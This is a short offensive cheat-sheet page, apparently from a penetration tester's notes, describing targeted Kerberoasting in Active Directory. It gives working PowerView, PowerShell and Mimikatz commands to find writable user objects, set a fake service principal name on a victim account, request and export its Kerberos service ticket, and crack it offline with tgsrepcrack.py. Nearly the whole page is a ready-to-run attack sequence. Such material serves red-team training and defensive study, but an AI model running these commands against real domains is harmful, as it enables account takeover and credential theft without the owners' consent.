---
description: 'Kerberoast: Set SPN'
---

# Kerberoast: Set SPN

> If we have permissions (GenericAll/GenericWrite), a target user's SPN can be set and request a TGS to Kerberoast it. If a user SPN attribute is not null, then the DC treats it as a service account. SPN should be unique, doesn't matter if it makes sense.

### 1. Enumerate permissions of our current user for any user

```bash
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "RDPUsers"} #Group we are member of
Invoke-ACLScanner -ResolveGUIDs | ?{$_.IdentityReference -match "$USER"} #Our current user
```

### 2. See if the user already has a SPN

```bash
#Using powerview_dev:
Get-DomainUser -Identity $USER | select serviceprincipalname
```

### 3. Set SPN for that user

```bash
Set-DomainObject -Identity $USER -Set @{serviceprincipalname='ops/whatever'}
```

### 4. Request a TGS for that SPN

```bash
#Powershell:
PS> Add-Type -AssemblyName System.IdentityModel
PS> New-Object System.IdentityModel.Tokens.KerberosRequestorSecurityToken -ArgumentList "MSSQL/$DOMAIN"

#PowerView:
Request-SPNTicket
```

### 5. Verify we got the ticket

```bash
klist
```

### 6. Export tickets

```bash
Invoke-Mimikatz -Command '"kerberos::list /export"'
```

### 7. Crack the ticket

```bash
#Using Kerberoast tool
python.exe .\tgsrepcrack.py .\$WORDLIST .\$TICKET_NAME.kirbi
```
